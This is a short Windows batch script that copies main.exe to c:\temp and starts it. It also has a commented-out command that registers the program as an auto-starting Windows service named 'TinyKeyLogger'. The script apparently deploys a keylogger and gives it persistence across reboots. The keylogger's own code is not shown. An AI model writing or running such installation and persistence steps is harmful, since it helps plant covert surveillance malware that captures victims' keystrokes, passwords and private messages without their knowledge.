copy main.exe c:\temp
start /d "c:\temp" main.exe
REM start sc create "TinyKeyLogger" displayname="A Tiny Keylogger" type="own" obj="XXXXX" password="XXXXX" start="auto" binpath="c:\temp\main.exe"
